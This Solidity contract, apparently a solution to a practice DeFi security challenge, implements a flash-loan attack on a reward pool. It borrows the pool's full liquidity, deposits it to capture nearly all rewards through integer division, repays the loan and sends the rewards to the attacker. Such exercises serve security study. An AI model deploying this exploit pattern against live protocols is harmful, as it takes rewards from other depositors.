// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
// import { SafeTransferLib, ERC4626, ERC20 } from "solmate/src/mixins/ERC4626.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IPool {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}

contract RewarderAttacker {
    IPool private immutable lendingPool;
    IRewardPool private immutable rewardPool;
    address private immutable attacker;
    IERC20 private immutable liquidityToken;
    IERC20 private immutable rewardToken;


    constructor(
        address _rewardPoolAddress, 
        address _lendingPoolAddress,
        address _liquidityTokenAddress,
        address _rewardTokenAddress) {
        
        attacker = msg.sender;
        rewardPool = IRewardPool(_rewardPoolAddress);
        lendingPool = IPool(_lendingPoolAddress);
        liquidityToken = IERC20(_liquidityTokenAddress);
        rewardToken = IERC20(_rewardTokenAddress);
    }

    function attack() external {
        uint balance = liquidityToken.balanceOf(address(lendingPool));
        
        lendingPool.flashLoan(balance);
    }

    // Henryk:
    // I will deposit such a high amount into the rewardPool, the other
    // addresses will receive 0 reward because of the integer division
    function receiveFlashLoan(uint256 amount) public {
        // Henryk: we need to use the pattern of calling "approve()" because
        // the "deposit()" method is going to do a "safeTransferFrom()"
        // after it does it's internal book keeping
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);

        
        rewardPool.distributeRewards();
        rewardPool.withdraw(amount);

        liquidityToken.transfer(address(lendingPool), amount);

        uint tokens = rewardToken.balanceOf(address(this));
        rewardToken.transfer(attacker, tokens);
    }

    // Henryk: Note I can't use receive here because eth is not coming to the 
    // smart contract
    // receive() external payable {
    //     console.log("henryk - receive was hit");
    // }
}